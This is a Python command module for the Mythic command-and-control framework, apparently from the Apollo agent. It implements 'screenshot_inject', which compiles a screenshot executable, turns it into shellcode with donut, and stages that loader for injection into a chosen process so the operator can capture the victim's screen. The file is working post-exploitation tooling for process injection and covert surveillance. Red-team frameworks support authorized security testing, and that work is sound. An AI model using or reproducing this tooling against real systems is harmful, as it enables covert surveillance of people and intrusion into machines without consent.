import os
from mythic_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_container.MythicRPC import *
import base64
import tempfile
from distutils.dir_util import copy_tree
import shutil
import os
import asyncio

SCREENSHOT_INJECT = "/srv/ScreenshotInject.exe"


class ScreenshotInjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number, description="Process ID to inject into."),
            CommandParameter(
                name="count",
                cli_name="Count",
                display_name="Number of Screenshots",
                type=ParameterType.Number,
                description="The number of screenshots to take when executing.",
                default_value=1,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                    ),
                ]),
            CommandParameter(
                name="interval",
                cli_name="Interval",
                display_name="Interval Between Screenshots", 
                type=ParameterType.Number, 
                description="Interval in seconds to wait between capturing screenshots. Default 0.",
                default_value=0,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                    ),
                ])
        ]

    async def parse_arguments(self):
        if not len(self.command_line):
            raise Exception("Usage: {}".format(ScreenshotInjectCommand.help_cmd))

        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.strip().split(" ")
            if len(parts) > 0:
                self.args["pid"].value = int(parts[0])
            else:
                raise Exception("Usage: {}".format(ScreenshotInjectCommand.help_cmd))
            if len(parts) >= 1:
                self.args["count"].value = int(parts[1])
            if len(parts) >= 2:
                self.args["interval"].value = int(parts[2])
            
        self.add_arg("pipe_name", str(uuid4()))
        pass


class ScreenshotInjectCommand(CommandBase):
    cmd = "screenshot_inject"
    needs_admin = False
    help_cmd = "screenshot_inject [pid] [count] [interval]"
    description = "Take a screenshot in the session of the target PID"
    version = 2
    author = "@reznok, @djhohnstein"
    argument_class = ScreenshotInjectArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1113"]
    supported_ui_features=["screenshot_inject"]

    async def build_screenshotinject(self):
        global SCREENSHOT_INJECT
        agent_build_path = tempfile.TemporaryDirectory()
        outputPath = "{}/ScreenshotInject/bin/Release/ScreenshotInject.exe".format(agent_build_path.name)
            # shutil to copy payload files over
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/ScreenshotInject/ScreenshotInject.csproj".format(agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build ScreenshotInject.exe:\n{}".format(stdout.decode() + "\n" + stderr.decode()))
        shutil.copy(outputPath, SCREENSHOT_INJECT)


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global SCREENSHOT_INJECT
        if not path.exists(SCREENSHOT_INJECT):
            await self.build_screenshotinject()
        donutPath = os.path.abspath(self.agent_code_path / "donut")
        if not path.exists(donutPath):
            raise Exception("Could not find {}".format(donutPath))
        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
        stdout, stderr = await proc.communicate()
        
        command = "{} -f 1 -p \"{}\" {}".format(donutPath, taskData.args.get_arg("pipe_name"), SCREENSHOT_INJECT)
        # need to go through one more step to turn our exe into shellcode
        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
        stdout, stderr = await proc.communicate()
        if os.path.exists("/tmp/loader.bin"):
            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=open("/tmp/loader.bin", 'rb').read(),
                DeleteAfterFetch=True
            ))
            if file_resp.Success:
                taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
            else:
                raise Exception("Failed to register screenshot assembly: " + file_resp.Error)
        else:
            raise Exception("Failed to find loader.bin")
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp